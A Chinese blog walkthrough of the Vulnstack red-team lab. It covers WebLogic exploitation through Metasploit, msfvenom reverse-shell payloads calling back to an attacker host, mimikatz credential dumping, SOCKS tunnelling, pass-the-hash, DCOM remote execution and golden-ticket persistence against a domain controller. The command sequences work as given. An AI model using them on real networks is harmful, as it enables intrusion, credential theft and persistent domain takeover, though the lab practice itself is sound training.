## 前言

最近做了做红日的vulnstack，感觉蛮好玩的，写篇文章记录一下解题过程。

### 环境搭建

首先配置模拟内外网环境

[![W2lJ54.png](https://image.3001.net/images/20210729/1627567050_6102b3cacb8661b5d3aac.png!small)](https://imgtu.com/i/W2lJ54)

其中，10.10.10.0为内网网段

192.168.111.0为模拟外网网段

本次靶场靶机共三台，网络配置分别如下

WEB：

[![W2ouWT.png](https://image.3001.net/images/20210729/1627567054_6102b3ceb28968bea3ac4.png!small)](https://imgtu.com/i/W2ouWT)

拥有两张网卡，一台连接外网，另一台连接内网

进入weblogic目录手动开启weblogic

[![](https://image.3001.net/images/20210729/1627567059_6102b3d3224b8ec901d33.png!small)](https://imgtu.com/i/WWctKI)

[![WWcIG4.png](https://image.3001.net/images/20210729/1627567062_6102b3d6365b08d86ef11.png!small)](https://imgtu.com/i/WWcIG4)

PC：

[![W2oMSU.png](https://image.3001.net/images/20210729/1627567065_6102b3d9e3e0c5c42211c.png!small)](https://imgtu.com/i/W2oMSU)

拥有两张网卡，一张连接外网，一张连接内网

DC：

[![W2o06e.png](https://image.3001.net/images/20210729/1627567074_6102b3e23b5e715d45c7c.png!small)](https://imgtu.com/i/W2o06e)

拥有一张网卡，只能与内网中主机通信

### 本次实验网络拓扑

[![W27yJP.png](https://image.3001.net/images/20210729/1627567090_6102b3f2ac38b736d06cd.png!small)](https://imgtu.com/i/W27yJP)

从攻击机上只能直接访问到WEB上开放的web服务

### 实验开始

首先扫描已知web服务器开放端口及服务

    
    
    nmap -sV 192.168.111.80
    

-sV意思是探测开放端口以确定服务/版本信息

[![WWWSWF.png](https://image.3001.net/images/20210729/1627567096_6102b3f83c0a315f007d6.png!small)](https://imgtu.com/i/WWWSWF)

可以看出在目标主机上1433端口运行着mysql服务，3389被防火墙所保护，7001端口开放着weblogic服务，看到weblogic

我们首先便想到是否存在曾经爆出过的RCE

从GitHub上找一个weblogin漏扫扫一波

    
    
    python WeblogicScan.py 192.168.111.80 7001
    

[![WWzfjs.png](https://image.3001.net/images/20210729/1627567102_6102b3fe5de8e944d4a17.png!small)](https://imgtu.com/i/WWzfjs)

扫出了后台地址泄露与两个CVE，从百度上看了看，每个版本的 WeblogicScan扫出来的好像都不太一样。。。

首先去后台爆破一下弱密码试试

[![WfS6q1.png](https://image.3001.net/images/20210729/1627567110_6102b406e197a0c40d3c7.png!small)](https://imgtu.com/i/WfS6q1)

可惜没有成功，那么便试一试CVE_2018_2628

从网上找一个该漏洞的利用脚本打打试试：

    
    
    git clone https://github.com/jas502n/CVE-2018-2628.git
    

[![WfPVW8.png](https://image.3001.net/images/20210729/1627567115_6102b40bee04e61591d45.png!small)](https://imgtu.com/i/WfPVW8)

    
    
    python CVE-2018-2628-Getshell.py 192.168.111.80 7001 123456.jsp
    

这里的shell名称可以自定义，不过注意必须长度为10个字符

[![WfkAF1.png](https://image.3001.net/images/20210729/1627567120_6102b41060c470c1f4288.png!small)](https://imgtu.com/i/WfkAF1)

攻击成功后会返回一个命令运行的url点击进入便可以看到命令执行结果（whoami的base64结果为d2hvYW1pCg==）

[![WfkN6S.png](https://image.3001.net/images/20210729/1627567125_6102b415bf0b886dae435.png!small)](https://imgtu.com/i/WfkN6S)

可以看到当前已经获得了WEB的管理员命令执行权限，接下来便是尝试上传一个msf马从而进一步扩大权限

首先在msf上生成一个powershell格式的马

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.111.128 lport=4444 -f psh-cmd > haixian.ps1
    

将生成的psl格式的文件中内容进行base64编码，放到参数tom中打一打，同时在msf中开启监听

打了半天没反应，又从网上找了好多其他的cve-2018-2628利用方法都没有成功（弟弟太菜了）

于是尝试换一个漏洞，之前我了解到，不同版本的weblogic扫描器扫出来结果不太相同，也就是说有可能目标存在该漏洞

而扫描器扫不出来，所以从网上看了看其他大佬们的解题过程，发现他们还扫描出了cve-2019-2725这个漏洞，恰好msf

中有对应的利用模块

    
    
    search weblogic
    use 5 
    options
    set target 1(因为默认target为0是针对unix系统的，而这里的靶机是windows)
    set rhosts 192.168.111.80
    set lhost 192.168.111.128
    run
    

[![W5cyL9.png](https://image.3001.net/images/20210729/1627567132_6102b41cb309bbc955f67.png!small)](https://imgtu.com/i/W5cyL9)

[![W5chRO.png](https://image.3001.net/images/20210729/1627567143_6102b427bd0b812c5ec73.png!small)](https://imgtu.com/i/W5chRO)

[![W5cIQe.png](https://image.3001.net/images/20210729/1627567154_6102b4329ffad7dfd53f7.png!small)](https://imgtu.com/i/W5cIQe)

可见回弹了管理员权限的meterpreter，至此，我们基本完成对与内地一台主机WEB的渗透，接下来开始域内信息收集并

横向移动

### 内网渗透

惯用的套路先查看本机信息再查看域信息

    
    
    net time /domain        #查看时间服务器，判断主域，主域服务器都做时间服务器
    net user /domain        #查看域用户
    net view /domain        #查看有几个域
    ipconfig /all 　　　　　  #查询本机IP段，所在域等 
    net config Workstation  #当前计算机名，全名，用户名，系统版本，工作站域，登陆域 
    net user 　　　　　　　   #本机用户列表
    net group "domain computers" /domain   #查看域内所有的主机名 
    net group "domain admins" /domain      #查看域管理员 
    net group "domain controllers" /domain #查看域控
    

当我们运行net time /domain时系统提示禁止访问

[![WTK9kq.png](https://image.3001.net/images/20210729/1627567162_6102b43a995f04db92352.png!small)](https://imgtu.com/i/WTK9kq)

猜测此时用户不是域内用户而是本机用户，所以尝试切换用户再次进行信息收集

切换用户首先要知道其他用户的用户名和密码，先尝试msf自带的kiwi抓取提示没有system权限

    
    
    load kiwi 
    creds_wdigest
    

[![WTMsG6.png](https://image.3001.net/images/20210729/1627567167_6102b43f7ceeba314bed8.png!small)](https://imgtu.com/i/WTMsG6)

[![WTM7z8.png](https://image.3001.net/images/20210729/1627567171_6102b443a63b0bb44a7c8.png!small)](https://imgtu.com/i/WTM7z8)

尝试简单的提权但是失败了

    
    
    getsystem
    

[![WTQgf0.png](https://image.3001.net/images/20210729/1627567174_6102b4468ffec1eb37c67.png!small)](https://imgtu.com/i/WTQgf0)

鉴于msf里面的kiwi模块经常不好使，所以我们上传一个自己的mimikatz再尝试抓取一次

    
    
    upload /home/haixian/mimikatz.exe C://
    shell
    chcp 65001
    cd C://
    dir
    mimikatz.exe
    privilege::debug
    sekurlsa::logonpasswords
    

[![WTl5gf.png](https://image.3001.net/images/20210729/1627567181_6102b44d7472b26d3895e.png!small)](https://imgtu.com/i/WTl5gf)

[![WTlLUs.png](https://image.3001.net/images/20210729/1627567193_6102b459069c6d85b6505.png!small)](https://imgtu.com/i/WTlLUs)

[![WT17z6.png](https://image.3001.net/images/20210729/1627567230_6102b47ee1dcd4b100ed7.png!small)](https://imgtu.com/i/WT17z6)

[![WT1jdH.png](https://image.3001.net/images/20210729/1627567237_6102b485b84f6b6632bd7.png!small)](https://imgtu.com/i/WT1jdH)

可见成功抓取了mssql、Administrator、de1ay、三个域用户的用户名和密码，接下来我们便切换到用户de1ay来进行信息

收集

    
    
    runas  /user:Administrator cmd
    

跑了好几次都是这样

[![WTtpKx.png](https://image.3001.net/images/20210729/1627567242_6102b48af213ce28b77e9.png!small)](https://imgtu.com/i/WTtpKx)

提示要输入密码但是不给输入密码的时间，不知道为啥。。（有大佬知道的欢迎斧正~）

无奈只能放弃，既然域信息暂时查看不了那就先看看本机的吧

    
    
    systeminfo
    ipconfig /all
    netstat -ano
    

  
[![WTtYzn.png](https://image.3001.net/images/20210729/1627567254_6102b496bc8a638156cc8.png!small)](https://imgtu.com/i/WTtYzn)

[![WTt8iQ.png](https://image.3001.net/images/20210729/1627567274_6102b4aa1e2883fe4bfe3.png!small)](https://imgtu.com/i/WTt8iQ)

从系统信息里可以看到居然只打了三个补丁。。。（不愧是靶机），但是我们更感兴趣的是开放的3389

既然刚刚已经抓取到了三个用户的明文密码，我们便尝试打开远程桌面

    
    
    rdesktop 192.168.111.80
    

[![WTUeDP.png](https://image.3001.net/images/20210729/1627567282_6102b4b2e9d3de35b7bae.png!small)](https://imgtu.com/i/WTUeDP)

尝试使用de1ay用户登录，被提示没有远程桌面权限，那就尝试Administrator登录，登陆后提示修改密码，修改为

HONGRISEC@2021后成功登陆

[![WTwlCD.png](https://image.3001.net/images/20210729/1627567295_6102b4bf1000fbb76653b.png!small)](https://imgtu.com/i/WTwlCD)

登录域管帐号之后我们就可以放心的进行域内信息收集了

    
    
    net time /domain        #查看时间服务器，判断主域，主域服务器都做时间服务器
    net user /domain        #查看域用户
    net config Workstation  #当前计算机名，全名，用户名，系统版本，工作站域，登陆域 
    net group "domain computers" /domain   #查看域内所有的主机名 
    net group "domain admins" /domain      #查看域管理员 
    net group "domain controllers" /domain #查看域控
    

[![WT0jwq.png](https://image.3001.net/images/20210729/1627567303_6102b4c7b593fd3ad1c7f.png!small)](https://imgtu.com/i/WT0jwq)

[![WTBFX9.png](https://image.3001.net/images/20210729/1627567309_6102b4cd0643d1508f737.png!small)](https://imgtu.com/i/WTBFX9)

[![WTyJKg.png](https://image.3001.net/images/20210729/1627567312_6102b4d02206ac961ad4e.png!small)](https://imgtu.com/i/WTyJKg)

[![WT6KL4.png](https://image.3001.net/images/20210729/1627567315_6102b4d30fd6587856fcb.png!small)](https://imgtu.com/i/WT6KL4)

[![WTg9Ej.png](https://image.3001.net/images/20210729/1627567317_6102b4d54c530ddb0d041.png!small)](https://imgtu.com/i/WTg9Ej)

经过信息收集可以知道的信息有：目标内网存在域de1ay.com，域内三台主机包括域控DC以及PC和WEB，域管理员为

Administrator，接下来我们便以WEB为跳板机进行横向移动

在WEB上上传EW搭建代理

    
    
    upload /home/haixian/ew-master c:\\
    

[![W7kaiF.png](https://image.3001.net/images/20210729/1627567322_6102b4da0def86041c6f4.png!small)](https://imgtu.com/i/W7kaiF)

在本地添加转接隧道

将本地1080端口收到的数据发送给5555端口

    
    
    ./ew_for_linux64 -s rcsocks -l 1080 -e 5555
    

[![WbVMzF.png](https://image.3001.net/images/20210729/1627567340_6102b4ecadb4431c33807.png!small)](https://imgtu.com/i/WbVMzF)

在跳板机执行

    
    
    ew_for_Win.exe -s rssocks -d 192.168.111.128 -e 5555
    

[![WbmByF.png](https://image.3001.net/images/20210729/1627567345_6102b4f170b7ee48c85c0.png!small)](https://imgtu.com/i/WbmByF)

[![Wbmyw9.png](https://image.3001.net/images/20210729/1627567350_6102b4f656236d1017518.png!small)](https://imgtu.com/i/Wbmyw9)

kali上收到回显，隧道搭建成功

接下来配置kali上的代理工具

    
    
    vim  /etc/proxychains.conf
    

[![Wbnx9x.png](https://image.3001.net/images/20210729/1627567353_6102b4f9dd04e1b9f9422.png!small)](https://imgtu.com/i/Wbnx9x)

接下来借助搭建好的隧道进行内网横向移动

首先扫描内网确定两台主机的ip

    
    
    proxychains nmap -sS -Pn 10.10.10.0/24
    

首先尝试速度快的SYN扫描，但是失败了，考虑到可能是存在边界设备拦截了某些类型的扫描数据包

[![WbKksU.png](https://image.3001.net/images/20210729/1627567359_6102b4ffad7a1e4bf5388.png!small)](https://imgtu.com/i/WbKksU)

多次尝试最终都没有成功，那就换个方法，尝试用获取的meterpreter来收集内网信息

    
    
    run get_local_subnets
    

[![WbNnxJ.png](https://image.3001.net/images/20210729/1627567365_6102b5058d6516474e5aa.png!small)](https://imgtu.com/i/WbNnxJ)

添加路由

    
    
    run autoroute -s 10.10.10.0/24
    

[![WbUkyd.png](https://image.3001.net/images/20210729/1627567369_6102b509589f14572be37.png!small)](https://imgtu.com/i/WbUkyd)

添加成功后我们使用msf的udp_sweep模块，通过发送udp包的形式来探测目标内网内的活跃主机

    
    
    search udp_sweep
    use 0
    options
    set rhosts 10.10.10.0/24
    set thread 50
    run
    

[![WbDk6S.png](https://image.3001.net/images/20210729/1627567375_6102b50f7c9d617869e98.png!small)](https://imgtu.com/i/WbDk6S)

扫描发现内网中DC的ip为10.10.10.10，而PC的ip为10.10.10.201，接下来我们首先对PC展开渗透

#### PC

刚刚我们已经在WEB上抓到了域内账户的用户名与密码，接下来便可以尝试使用这几个账号与PC建立连接

    
    
    net use \\10.10.10.201\ipc$ "HONGRISEC@2021" /user:administrator
    

[![WbrDCq.png](https://image.3001.net/images/20210729/1627567391_6102b51fc28c5b58b85f2.png!small)](https://imgtu.com/i/WbrDCq)

连接建立成功，尝试上传一个msf的马到PC上

    
    
    msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.111.128 lport=1234 -f exe >haixian.exe
    

[![Wbs1Z4.png](https://image.3001.net/images/20210729/1627567402_6102b52a3d8faf5d00175.png!small)](https://imgtu.com/i/Wbs1Z4)

首先上传到WEB上

    
    
    upload /home/haixian/haixian.exe c://
    

[![WbsHWq.png](https://image.3001.net/images/20210729/1627567409_6102b531b6b268f8b0ae0.png!small)](https://imgtu.com/i/WbsHWq)

再由WEB通过刚刚建立的IPC连接传到PC上

    
    
    copy c:\haixian.exe \\10.10.10.201\c$ /y
    

[![Wb6IGn.png](https://image.3001.net/images/20210729/1627567413_6102b5358a058c0fa16bd.png!small)](https://imgtu.com/i/Wb6IGn)

然后由WEB上的powershell通过DCOM控制PC执行haixian.exe

    
    
    load powershell 
    powershell_shell
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.201"))
    $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c C:\haixian.exe","Minimized")
    

[![WqVyEn.png](https://image.3001.net/images/20210729/1627567418_6102b53a79eddd4725ed7.png!small)](https://imgtu.com/i/WqVyEn)

[![WqVL8K.png](https://image.3001.net/images/20210729/1627567423_6102b53fd422d17db7c33.png!small)](https://imgtu.com/i/WqVL8K)

可是发现session很快会断掉，猜测可能是PC上的360起了作用

所以尝试对生成的木马进行免杀，具体免杀方法详见文章https://www.freebuf.com/articles/network/270218.html

免杀处理后成功上线，查看当前权限为管理员

[![Wq8d29.png](https://image.3001.net/images/20210729/1627567431_6102b547ed062846f29a2.png!small)](https://imgtu.com/i/Wq8d29)

至此PC已成功拿下，接下来向域控进军

DC

这个靶场里面PC与DC都用MSF扫出了永恒之蓝，但是可能由于防火墙的原因打不通，但是由于一开始我们就抓到了域管

账户名与密码，而且还抓到了哈希，这是一个突破口，尝试对域控采用哈希传递攻击

    
    
    mimikatz.exe
    sekurlsa::pth /domain:de1ay.com /user:Administrator /ntlm:662fb256a143db7df7ff0898c6cd8b2b
    

[![WqawF0.png](https://image.3001.net/images/20210729/1627567438_6102b54e3d86fba10e1d0.png!small)](https://imgtu.com/i/WqawF0)

尝试访问域控

    
    
    dir \\10.10.10.10\c$
    

[![Wqd9XQ.png](https://image.3001.net/images/20210729/1627567444_6102b5541c83293285732.png!small)](https://imgtu.com/i/Wqd9XQ)

成功访问，接下来便是重复之前的套路，传马，利用DCOM执行

    
    
    copy c:\haixian.exe \\10.10.10.10\c$
    

[![Wqd7CV.png](https://image.3001.net/images/20210729/1627567449_6102b559922c0ab383719.png!small)](https://imgtu.com/i/Wqd7CV)

    
    
    $com = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","10.10.10.10"))
    $com.Document.ActiveView.ExecuteShellCommand('cmd.exe',$null,"/c C:\haixian.exe","Minimized")
    

成功回弹

[![WqwrqJ.png](https://image.3001.net/images/20210729/1627567457_6102b5615eb0ed646f648.png!small)](https://imgtu.com/i/WqwrqJ)

成功拿下域控

### 后渗透

在实战情况下拿下一台主机的最高权限并不意味着渗透的结束，我们还需要利用已经取得的权限在目标主机上留有后门以

方便日后的“访问”

#### 制作并加载黄金票据

    
    
    mimikatz.exe
    lsadump::lsa /patch
    kerberos::golden /user:administrator /domain:de1ay.com /sid:S-1-5-21-2756371121-2868759905-3853650604 /krbtgt:82dfc71b72a11ef37d663047bc2088fb /ticket:haixian.kirbi
    

注意ntlm值是密钥分发中心对应的值

    
    
    kerberos::ptt ticket.kirbi
    

制作成功后把票据加载到内存里，然后就可以始终以最高权限访问域控了！

### 写在后面

这个靶场相较于上一个难度总体上说有所提升，考察到了weblogic反序列化漏洞的发现与利用以及哈希传递、黄金票据、

永恒之蓝、木马免杀、$ipc的搭建、DCOM的利用等等知识，比较适合新手进阶练习，接下来笔者会挑战更难一些的靶

场，敬请期待。

感谢阅读，溜了溜了~

部分内容参考大佬文章：https://whoamianony.top/2021/02/04/渗透测试/vulnstack/记一次Vulnstack靶场内网渗透（四）/

